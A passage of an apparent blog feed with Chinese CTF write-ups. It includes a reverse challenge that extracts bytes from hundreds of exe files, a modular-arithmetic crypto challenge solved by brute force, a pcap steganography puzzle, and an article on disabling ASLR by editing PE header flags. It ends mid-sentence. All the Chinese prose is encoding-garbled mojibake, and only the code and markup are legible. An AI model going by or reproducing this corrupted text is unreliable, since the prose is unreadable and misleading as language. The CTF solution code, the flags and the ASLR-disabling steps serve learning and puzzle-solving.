å¤šçœ‹äº†å‡ ä¸ªåŸæ¥çš„exeæ–‡ä»¶, æœç„¶ï¼Œæœ‰çš„æå–å†…å®¹çš„ä½ç½®ä¸ä¸€æ ·. ä½†æœ‰803ä¸ªexeã€‚</p></li><li><p>å¼€å§‹æ‰¾è§„å¾‹. åˆ—ä¸¾äº†å¾ˆå¤šè¿˜æ˜¯æ²¡å‘ç°. è¿™ä¹Ÿæ˜¯æœ¬é¢˜èŠ±è´¹æ—¶é—´æœ€å¤šçš„åœ°æ–¹â€¦â€¦..æ ¹æ®exeæ–‡ä»¶çš„å­—èŠ‚å¤§å°æ¥åŒºåˆ†â€¦æ”¹äº†ä¸€ä¸‹æå–å†…å®¹çš„ç¨‹åº.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, n = <span class="number">779</span>, j = <span class="number">0</span>, lenth = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">4000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> filename[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(filename, <span class="string">"%d.exe"</span>, j++);</span><br><span class="line">fp = fopen(filename, <span class="string">"rb"</span>);</span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">lenth = ftell(fp);</span><br><span class="line"><span class="keyword">if</span>(lenth == <span class="number">0xBDF1</span>)</span><br><span class="line">&#123;</span><br><span class="line">fseek(fp, <span class="number">0x1c20</span>, <span class="number">0</span>);</span><br><span class="line">fread(a, <span class="number">1</span>, <span class="number">0x20</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X"</span>, a[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">fseek(fp, <span class="number">0x1C40</span>, <span class="number">0</span>);</span><br><span class="line">fread(a, <span class="number">1</span>, <span class="number">0x40</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">63</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X"</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ä»ç„¶æ‰“ä¸å¼€, ä½†æ˜¯è¿™æ¬¡åŒºæ®µéƒ½æ˜¯é½çš„, idaå¯ä»¥æ‰“å¼€å°±å¥½äº†. </p></li><li><p>è½½å…¥ida, å‘ç°æœ‰å¾ˆå¤šå¹²æ‰°é¡¹, ä½†å¯ä»¥åœ¨æ¯”è¾ƒå‡½æ•°ä¸Šé¢ä¸€ä¸ªçœ‹å‡ºæ˜¯ base64åŠ å¯†. æœ€åä¸å¯†æ–‡æ¯”è¾ƒ.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524101529508.png" alt="image-20200524101529508"></p></li><li><p>æ‰¾å¯†æ–‡. å¯ä»¥å‘ç°æ˜¯ç¨‹åºè¿è¡Œæ‰èµ‹å€¼çš„.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524101634787.png" alt="image-20200524101634787"></p></li><li><p>æå–å‡ºæ¥baseè§£å¯†ä¸€ä¸‹, å†md5å¾—åˆ°flag. <strong>e801bcbcc42d3120d910ccc46ae640dd</strong></p></li></ul><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bbcrypto"><a href="#bbcrypto" class="headerlink" title="bbcrypto"></a>bbcrypto</h3><ul><li><p>ç”±äºpythonæ¥è§¦çš„å¾ˆå°‘ï¼Œåšäº†ä¸€ä¸ªå¯†ç å­¦çš„æ„Ÿè§‰åƒæ˜¯åœ¨å­¦pythonã€‚ä¸æ–­æŸ¥è¯­æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> A,SALT</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m, a, si)</span>:</span></span><br><span class="line"></span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</span><br><span class="line"></span><br><span class="line">        c+=hex(((ord(m[i])) * a + ord(next(si))) % <span class="number">128</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>)  <span class="comment">#ä¸è¶³2ä½ä»¥0å¡«å……ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    m = <span class="string">'flag&#123;********************************&#125;'</span></span><br><span class="line"></span><br><span class="line">    a = A</span><br><span class="line"></span><br><span class="line">    salt = SALT</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>(len(salt)==<span class="number">3</span>) <span class="comment">#assertç›¸å½“äºä¸€ä¸ªåˆ¤æ–­è¡¨è¾¾å¼ï¼Œè‹¥æ‹¬å·ä¸­è¡¨è¾¾å¼ä¸æˆç«‹åˆ™é€€å‡ºã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>(salt.isalpha()) <span class="comment">#æ£€æŸ¥æ˜¯å¦æ˜¯å­—æ¯</span></span><br><span class="line"></span><br><span class="line">    si = cycle(salt.lower()) <span class="comment">#cycleæŠŠå­—ç¬¦ä¸²saltå˜æˆä¸€ä¸ªå¾ªç¯ï¼Œç›¸å½“äº si[i++%3];</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"æ˜æ–‡å†…å®¹ä¸ºï¼š"</span>)</span><br><span class="line"></span><br><span class="line">    print(m)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š"</span>)</span><br><span class="line"></span><br><span class="line">    c=encrypt(m, a, si)</span><br><span class="line"></span><br><span class="line">    print(c)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d</span></span><br></pre></td></tr></table></figure></li><li><p>ä»é¢˜ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒAä¸saltæœªçŸ¥ï¼Œä½†æ˜¯saltç»™å‡ºäº†é™åˆ¶ï¼Œå¿…é¡»å­—æ¯ä¸”3ä½ã€‚</p></li><li><p>åˆçŸ¥é“flagçš„æ ¼å¼ <strong>flag{ }</strong>ï¼Œé‚£ç»“åˆå¯†æ–‡ä¸åŠ å¯†è¡¨è¾¾å¼ï¼Œç›´æ¥åˆ—æ–¹ç¨‹åŠ çˆ†ç ´è§£å‡ºæœªçŸ¥é‡å³å¯ã€‚</p></li><li><p>è®°å¾—å½“æ—¶è§£å‡º A  = 57. si = â€œahhâ€. å¼€å§‹è§£å¯†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, lenth = <span class="built_in">strlen</span>(a), sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> c[<span class="number">3</span>] = &#123;<span class="number">97</span>, <span class="number">104</span>, <span class="number">104</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt;= <span class="number">97</span> &amp;&amp; a[i] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i] &gt;= <span class="number">65</span> &amp;&amp; a[i] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] -= <span class="number">48</span>; </span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">97</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">65</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">48</span>;</span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i+<span class="number">1</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b[j++] = sum, sum = <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">38</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">33</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i*<span class="number">57</span> + c[j%<span class="number">3</span>])%<span class="number">128</span> == b[j])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, i); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>flag: flag{ad7d973ffdd285b476a1a727b3a8fbc4}</strong></p></li></ul><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Questionaire"><a href="#Questionaire" class="headerlink" title="Questionaire"></a>Questionaire</h3><ul><li>å¼€å§‹ç½‘ç«™å§‹ç»ˆæ‰“ä¸å¼€ï¼Œå› ä¸ºæ²¡æ¥è§¦è¿‡webï¼Œå§‹ç»ˆè®¤ä¸ºæ˜¯è€ƒwebçš„çŸ¥è¯†ã€‚</li><li>åé¢æƒ³ç€æŒ‚vpnè¯•è¯•ã€‚æ‰“å¼€äº†ï¼Œå¾ˆå¤šåˆéš¾æ€§é—®é¢˜ï¼Œç›´æ¥æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæ‰¾åˆ°å¯¹åº”ç­”æ¡ˆå³å¯ã€‚</li></ul><h3 id="bin-cat-2"><a href="#bin-cat-2" class="headerlink" title="/bin/cat 2"></a>/bin/cat 2</h3><ul><li>å¾—åˆ°ä¸€å¼  gif å›¾ç‰‡ï¼Œ è¿˜æ˜¯è€åŠæ³•æ”¾åœ¨ stegesolve å·¥å…·ä¸­çœ‹çœ‹ã€‚</li><li>å¼€å§‹çœ‹äº†å¥½å‡ åœˆä¹Ÿæ²¡çœ‹å‡ºä»€ä¹ˆåå ‚ï¼Œä¹Ÿæ˜¯å¾ˆä¹…äº†ï¼Œåœ¨red planeçš„é¡µé¢å‘ç°å¾ˆåƒä¸€ä¸ªäºŒç»´ç ï¼Œå¸¦ç€è¯•ä¸€è¯•ç”¨å·¥å…·æˆªå–äº†ä¸‹æ¥ã€‚</li><li>ä½¿ç”¨ PsQREdit 2.4.3 çœŸçš„å¾—åˆ°äº† flag.  å…·ä½“é¢˜æ²¡æœ‰ä¿ç•™ä¸‹æ¥ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®ºå‰‘åœº</title>
      <link href="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/"/>
      <url>/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>è®ºå‰‘åœºåˆ·é¢˜è®°å½•ã€‚<a id="more"></a></p><h2 id="Refresh-it"><a href="#Refresh-it" class="headerlink" title="Refresh it"></a>Refresh it</h2><p>é¢˜ç›®ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ª.pcapngæ–‡ä»¶ï¼Œå…ˆç”¨010editorçœ‹äº†çœ‹ä¼šä¸ä¼šåªæ˜¯ç®€å•çš„å°†æ–‡ä»¶æ ¼å¼æ”¹äº†ï¼Œå› ä¸ºæ˜¯reverseé¢˜ï¼Œçœ‹äº†ä¸€åœˆï¼Œçš„å´æ˜¯æµé‡åŒ…ã€‚</p><p>åœ¨wiresharkä¸­å°è¯•æœç´¢äº†é¢˜ç›®å…³é”®å­—refreshï¼Œæ²¡æœ‰å¾—åˆ°æœ‰ç”¨ä¿¡æ¯ã€‚åˆæ¥ç€å°è¯•äº†æœç´¢äº†å¾ˆå¤šï¼Œéƒ½æ— æœã€‚</p><p>è½¬åˆ°foremostå’Œbinwalkçœ‹çœ‹æ²¡æœ‰ä»€ä¹ˆéšè—æ–‡ä»¶ã€‚ ç¡®å®çœ‹åˆ°äº†2å¼ å›¾ç‰‡ï¼Œæå–å‡ºæ¥ä½†æ‰“ä¸å¼€ï¼Œè€ƒè™‘exeæ–‡ä»¶éšè—åœ¨å›¾ç‰‡æ–‡ä»¶ä¸­ï¼ŒæŸ¥çœ‹äº†å›¾ç‰‡æ–‡ä»¶ä¿¡æ¯ï¼ŒPEæ–‡ä»¶çš„å½±å­éƒ½æ²¡æœ‰ğŸ¤£ã€‚ æ²¡åŠæ³•äº†ï¼Œé¢˜ç›®å…ˆæ”¾ä¸€æ®µæ—¶é—´ã€‚</p><p>è¿™åˆæ˜¯è¿‡äº†å‡ å¤©æ¥çœ‹è¿™ä¸ªé¢˜ç›®ï¼Œæ„Ÿè§‰è‡ªå·±æ‰¾ä¸åˆ°ç›®æ ‡ï¼Œåœ¨ç›²ç›®çš„æ‰¾â€¦å¾ˆå¤šåŠæ³•éƒ½è¯•äº†ä¸‹ã€‚å”¯ä¸€å¾—åˆ°çš„å°±æ˜¯å›¾ç‰‡ã€‚</p><p>çœ‹äº†çœ‹å›¾ç‰‡ä¿¡æ¯ï¼Œå‘ç°F5 refrehshã€‚åˆä»é¢˜ç›®çš„ä¿¡æ¯ï¼Œä½ çœ‹åˆ°åˆ·æ–°æŒ‰é’®äº†å˜›ã€‚çªç„¶æƒ³åˆ°ä¹‹å‰åšè¿‡ä¸€ä¸ªæ‚é¡¹é¢˜æ˜¯F5-steganographyéšå†™ã€‚åé¢é‚£ä¸ªçš„refreshçŒœæµ‹æ˜¯å¯†ç ã€‚è¿å¿™å»è¯•äº†ä¸‹ï¼Œé”™è¯¯ï¼Œï¼Œä½†æ˜¯è¿™ä¸ªç¡®å®å¾ˆåƒæ˜¯è€ƒéšå†™ã€‚<img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512194627578.png" alt="image-20200512194627578"></p><p>è€ƒè™‘æ˜¯binwalkæå–å›¾ç‰‡æœ‰æŸåæˆ–è€…ä¸å…¨çš„åŸå› ï¼Œå› ä¸ºå›¾ç‰‡æ˜¯æ‰“ä¸å¼€çš„ã€‚ åˆè·‘å»wiresharkã€‚å› ä¸ºè¿™æ¬¡æ˜ç¡®æ˜¯æ‰¾å›¾ç‰‡ï¼Œç›´æ¥æœç´¢äº† jpgï¼Œæœç„¶å‡ºç°äº†ä¸ªå›¾ç‰‡<img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512200418460.png" alt="image-20200512200418460"></p><p>è¿½è¸ªtcpæµæŠŠå›¾ç‰‡çš„äºŒè¿›åˆ¶ä»£ç å¤åˆ¶ä¸‹æ¥ï¼Œwinhexé‡å»ºä¸€ä¸ªæ–‡ä»¶ç²˜è´´ä¿å­˜.æ³¨æ„æ–‡ä»¶å¤´FF D8 æ–‡ä»¶å°¾ FF D9<img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512200649037.png" alt="image-20200512200649037"></p><p>è¿™æ¬¡å›¾ç‰‡å¯ä»¥æ‰“å¼€äº†ï¼Œæ˜¯ä¸ªåˆ·æ–°æŒ‰é’®ï¼Œå†æ¬¡å»ç”¨F5éšå†™æ¥è§£å¯†ã€‚ç»ˆäºæˆåŠŸäº†ï¼</p><p><img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512200849581.png" alt="image-20200512200849581"></p><p><strong>æ€»ç»“: æ„Ÿè§‰èŠ±äº†å¾ˆå¤šæ—¶é—´ï¼Œç®€ç›´å°±æ˜¯æ‚é¡¹é¢˜ã€‚å¦å¤–é¢˜çš„æç¤ºä¿¡æ¯å¤ªå°‘ã€‚ç†Ÿæ‚‰äº†ä¸€äº›å·¥å…·çš„ä½¿ç”¨å§ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ASLR</title>
      <link href="/2020/05/12/ASLR/"/>
      <url>/2020/05/12/ASLR/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>å¼€å§‹æ˜¯ä¸€é“CTFé¢˜åŠ äº†UPXå£³,  åˆ©ç”¨å †æ ˆå¹³è¡¡è„±å£³,import recè¿›è¡ŒIATä¿®å¤å,ç¨‹åºä¸èƒ½æ­£å¸¸æ‰“å¼€äº†.  åæ¥æ‰çŸ¥é“æ˜¯å¼€å¯äº†ASLR, å…³é—­åå³å¯æ‰“å¼€ã€‚ åŠ å£³ä¼šå¯¹PEæ–‡ä»¶çš„é‡å®šä½è¡¨è¿›è¡Œå‹ç¼©,åœ¨ODç›´æ¥dumpå‡ºçš„ç¨‹åºæ˜¯ä¸¢å¤±é‡å®šä½è¡¨çš„, è€Œç¨‹åºåˆæ˜¯å¼€å¯äº†ASLR,é‚£ç¨‹åºè‡ªç„¶ä¼šè®¿é—®åˆ°æ— æ•ˆçš„åœ°å€è€Œæ‰“ä¸å¼€</strong></p></blockquote><a id="more"></a><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>ASLR(åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–), ä¸€ç§é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨ä¿æŠ¤æŠ€æœ¯. ä»Windows Vsita(å†…æ ¸ç‰ˆæœ¬<strong>6.0</strong>)å¼€å§‹é‡‡ç”¨, è€ŒWindows XPçš„å†…æ ¸ç‰ˆæœ¬æ˜¯<strong>5.1</strong>, æ‰€ä»¥æˆ‘ä»¬åœ¨Windows XPä¸‹è„±å¼€å¯äº†ASLR çš„å£³æ˜¯ä¸ä¼šæœ‰è¿™ä¸ªé—®é¢˜çš„.</p><p>ASLRå°±æ˜¯ä½¿æˆ‘ä»¬çš„PEæ–‡ä»¶åœ¨æ¯æ¬¡è½½å…¥å†…å­˜æ—¶èµ·å§‹åœ°å€éƒ½ä¼šå˜å¾—éšæœºåŒ–, å¢åŠ æ¶æ„ç”¨æˆ·ç¼–å†™æ¼æ´åˆ©ç”¨ä»£ç çš„éš¾åº¦(<strong>åœ¨ä¹‹å‰æˆ‘ä»¬çŸ¥é“åªæœ‰dllæ–‡ä»¶åœ¨ç†æƒ³åœ°å€ç©ºé—´è¢«å ç”¨äº†æ‰ä¼šè¿›è¡Œé‡å®šä½</strong>)</p><p>å¯¹äºASLRåŠŸèƒ½æˆ‘ä»¬ç³»ç»Ÿ(win10)æ˜¯é»˜è®¤å…³é—­çš„, æˆ‘ä»¬å¯ä»¥åœ¨è®¾ç½®çš„å®‰å…¨ä¸­å¿ƒæ‰“å¼€.<img src="/2020/05/12/ASLR/image-20200511184233641-1589256958059.png" alt="image-20200511184233641"></p><p>å¦å¤–å°±æ˜¯å¯æ‰§è¡Œæ–‡ä»¶çš„ASLR, æˆ‘ä»¬åœ¨æˆ‘ä»¬çš„ç¼–è¯‘å™¨ä¸Šä¹Ÿå¯ä»¥é€‰æ‹©æ˜¯å¦å¼•ç”¨è¯¥åŠŸèƒ½.<img src="/2020/05/12/ASLR/image-20200511185012962-1589256958060.png" alt="image-20200511185012962"></p><h2 id="åˆ†æASLR"><a href="#åˆ†æASLR" class="headerlink" title="åˆ†æASLR"></a>åˆ†æASLR</h2><p>ä»¥VSç¼–è¯‘å™¨å†™ä¸€ä¸ªç¨‹åº, åˆ†åˆ«ç”Ÿæˆå¼€å¯äº†éšæœºåŸºå€ä¸æœªå¼€å¯çš„çš„ç‰ˆæœ¬æ¥åˆ†æ. (<strong>ä¸€å…±æœ‰ä¸‰ä¸ªåœ°æ–¹ä¸åŒ</strong>)</p><p><strong>(1)</strong>æœªå¼€å¯ASLRçš„ç¨‹åºçš„<strong>æ–‡ä»¶å¤´çš„Characteristics</strong>ä¼šå¤šä¸€ä¸ª <strong>IMAGE_FILE_RELOCS_STRIPPED   0X0001</strong> çš„å±æ€§, ç»è¿‡æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£å¯ä»¥çœ‹å¾—åˆ°å±æ€§è§£é‡Š, æ‰€ä»¥æˆ‘ä»¬å¼€å¯ASLRdçš„ç¨‹åºä¸ä¼šæœ‰è¿™ä¸ªå±æ€§<img src="/2020/05/12/ASLR/image-20200511200244008-1589256958060.png" alt="image-20200511200244008"></p><p>â€‹    ä¸‹é¢çœ‹ç¨‹åºå¯¹æ¯”:</p><p><img src="/2020/05/12/ASLR/image-20200511201513817-1589256958060.png" alt="image-20200511201513817"></p><p><strong>(2)</strong>å¼€å¯äº†ASLRçš„ç¨‹åºçš„<strong>å¯é€‰å¤´çš„DllCharacteristics</strong>å¤šäº†<strong>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</strong></p><p><strong>0X0040</strong>çš„å±æ€§. åŒæ ·æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£. å³é‡å®šä½æ—¶éœ€è¦çš„å±æ€§.<img src="/2020/05/12/ASLR/image-20200511201801401-1589256958060.png" alt="image-20200511201801401"></p><p>ç¨‹åºå¯¹æ¯”:<img src="/2020/05/12/ASLR/image-20200511202308748-1589204427416-1589204437657-1589256958060.png" alt="image-20200511202308748"></p><p><strong>(3)</strong>å¼€å¯äº†ASLRçš„ç¨‹åºä¼šå¤šä¸€ä¸ª <strong>.reloc</strong> èŠ‚(ä¸€èˆ¬æ™®é€šçš„exeæ–‡ä»¶æ˜¯ä¸éœ€è¦è¯¥èŠ‚çš„, ç”¨äºå¼€å¯ASLRçš„ç¨‹åºè¿›è¡Œé‡å®šä½, å½“ç„¶æˆ‘ä»¬å…³é—­äº†ASLRä¹Ÿå¯ä»¥æŠŠè¿™ä¸ªèŠ‚åˆ äº†)<img src="/2020/05/12/ASLR/image-20200511202858464-1589256958060.png" alt="image-20200511202858464"></p><h2 id="å…³é—­ASLR"><a href="#å…³é—­ASLR" class="headerlink" title="å…³é—­ASLR"></a>å…³é—­ASLR</h2><p>ç”±ä¸Šé¢çš„åˆ†æçŸ¥é“æœ‰3å¤„ä¸åŒ, å…¶ä¸­ä¸Šé¢çš„<strong>(1)</strong>ä¸­æ˜¯å¼€å¯äº†ASLRçš„ç¨‹åºå°‘äº† <strong>IMAGE_FILE_RELOCS_STRIPPED   0X0001</strong>å±æ€§, æˆ‘ä»¬å¢åŠ ä¸Šè¿™ä¸ªå±æ€§å³å¯å…³é—­ASLR(å³ <strong>0102 -&gt; 0103</strong> / <strong>å¯¹åº”å±æ€§æ‰“ä¸Šå‹¾å³å¯</strong>).    å¦å¤–<strong>(2)</strong>ä¸­æ˜¯å¤šäº†<strong>DLL can move</strong>çš„å±æ€§,åˆ é™¤è¿™ä¸ªå±æ€§,åŒæ ·å¯ä»¥å…³é—­ASLR(å³ <strong>8140 -&gt; 8100</strong> / <strong>å¯¹åº”å±æ€§å–æ¶ˆæ‰“å‹¾å³å¯</strong> )</p><p>ä¸‹é¢ç¤ºä¾‹åœ¨010ç¼–è¯‘å™¨ä¸­ä¿®æ”¹æ•°å€¼æ¥å…³é—­ASLR.<img src="/2020/05/12/ASLR/image-20200511204613644-1589256958060.png" alt="image-20200511204613644"></p><blockquote><p><strong>ä»¥ä¸Šæ˜¯å…³äºASLRçš„åˆ†æå³å…³é—­, å¦‚æœå¼€å¯äº†ASLR, 